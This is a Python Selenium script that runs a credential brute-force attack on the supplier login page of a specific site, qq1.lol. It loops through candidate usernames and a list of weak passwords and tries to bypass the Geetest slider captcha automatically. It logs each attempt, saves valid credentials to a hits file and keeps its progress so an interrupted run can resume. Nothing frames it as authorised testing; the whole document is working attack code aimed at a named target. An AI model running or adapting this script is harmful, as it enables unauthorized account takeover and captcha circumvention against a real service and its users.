#!/usr/bin/env python3
"""qq1.lol sup supplier login brute with Geetest via Selenium"""
import json
import os
import sys
import time
from datetime import datetime
from pathlib import Path

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait

BASE = "https://qq1.lol"
OUT = Path(os.environ.get("QQ1_OUT", "/data/automation/results/qq1.lol"))
LOG = OUT / "sup_brute.log"
HITS = OUT / "sup_hits.txt"
PROGRESS = OUT / "sup_brute_progress.json"

USERS = os.environ.get("SUP_USERS", "admin,buyi,buyiq,root,test,sup,supplier,布衣,qq1").split(",")
PASSWORDS = [
    "admin", "123456", "123456789", "admin123", "admin888", "buyi", "buyiq",
    "qq1", "qq123456", "password", "111111", "666666", "888888", "123123",
    "admin@123", "Admin123", "a123456", "1234567890", "admin666", "buyi123",
    "buyi888", "qqkqq", "830603", "123456789s", "root", "test123", "qwerty",
    "admin2024", "admin2025", "admin2026", "Lxsj@123", "ruoyi123",
]

WAIT_CAPTCHA = int(os.environ.get("SUP_CAPTCHA_WAIT", "25"))


def log(msg):
    line = f"[{datetime.now():%Y-%m-%d %H:%M:%S}] {msg}"
    print(line, flush=True)
    OUT.mkdir(parents=True, exist_ok=True)
    with open(LOG, "a") as f:
        f.write(line + "\n")


def load_progress():
    if PROGRESS.exists():
        try:
            return json.loads(PROGRESS.read_text())
        except Exception:
            pass
    return {"user_idx": 0, "pwd_idx": 0}


def save_progress(user_idx, pwd_idx):
    PROGRESS.write_text(json.dumps({"user_idx": user_idx, "pwd_idx": pwd_idx}))


def make_driver():
    opts = Options()
    opts.add_argument("--headless=new")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--disable-gpu")
    opts.add_argument("--window-size=1280,900")
    opts.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0")
    return webdriver.Chrome(options=opts)


def solve_geetest(driver):
    """Wait for Geetest popup and try to click slider."""
    time.sleep(3)
    try:
        # switch to geetest iframe if present
        iframes = driver.find_elements(By.TAG_NAME, "iframe")
        for iframe in iframes:
            src = iframe.get_attribute("src") or ""
            if "geetest" in src:
                driver.switch_to.frame(iframe)
                break
        # click slider button
        for sel in [".geetest_slider_button", ".geetest_btn", "[class*='slider']"]:
            els = driver.find_elements(By.CSS_SELECTOR, sel)
            if els:
                from selenium.webdriver import ActionChains
                btn = els[0]
                ActionChains(driver).click_and_hold(btn).move_by_offset(260, 0).release().perform()
                time.sleep(2)
                break
        driver.switch_to.default_content()
    except Exception as e:
        log(f"  geetest auto-solve failed: {e}")
    # wait for captcha form hidden input
    deadline = time.time() + WAIT_CAPTCHA
    while time.time() < deadline:
        try:
            val = driver.execute_script(
                'return document.querySelector("input[name=geetest_validate]")?.value || ""'
            )
            if val:
                return True
        except Exception:
            pass
        time.sleep(1)
    return False


def try_login(driver, user, pwd):
    driver.get(f"{BASE}/sup/login.php")
    time.sleep(2)
    driver.find_element(By.NAME, "user").clear()
    driver.find_element(By.NAME, "user").send_keys(user)
    driver.find_element(By.NAME, "pass").clear()
    driver.find_element(By.NAME, "pass").send_keys(pwd)

    if not solve_geetest(driver):
        return "captcha_fail", ""

    driver.find_element(By.ID, "submit_login").click()
    time.sleep(2)

    # check redirect or alert
    url = driver.current_url
    if "index.php" in url and "login" not in url:
        return "hit", url
    # check via ajax response in page
    try:
        alert = driver.switch_to.alert
        msg = alert.text
        alert.accept()
        if "成功" in msg:
            return "hit", msg
        if "密码" in msg:
            return "wrong_pwd", msg
        return "other", msg
    except Exception:
        pass
    return "unknown", url


def main():
    prog = load_progress()
    ui, pi = prog["user_idx"], prog["pwd_idx"]
    log(f"=== sup brute start user_idx={ui} pwd_idx={pi} ===")

    driver = make_driver()
    try:
        for ui in range(ui, len(USERS)):
            user = USERS[ui]
            start_pi = pi if ui == prog["user_idx"] else 0
            for pi in range(start_pi, len(PASSWORDS)):
                pwd = PASSWORDS[pi]
                try:
                    status, detail = try_login(driver, user, pwd)
                    log(f"  {user}:{pwd} -> {status} {detail[:60]}")
                    if status == "hit":
                        with open(HITS, "a") as f:
                            f.write(f"{user}:{pwd}\n")
                        log(f"*** HIT {user}:{pwd} ***")
                        return
                    save_progress(ui, pi + 1)
                except Exception as e:
                    log(f"  {user}:{pwd} err: {e}")
                    try:
                        driver.quit()
                    except Exception:
                        pass
                    driver = make_driver()
                    time.sleep(3)
    finally:
        try:
            driver.quit()
        except Exception:
            pass
    log("=== sup brute done, no hit ===")


if __name__ == "__main__":
    main()
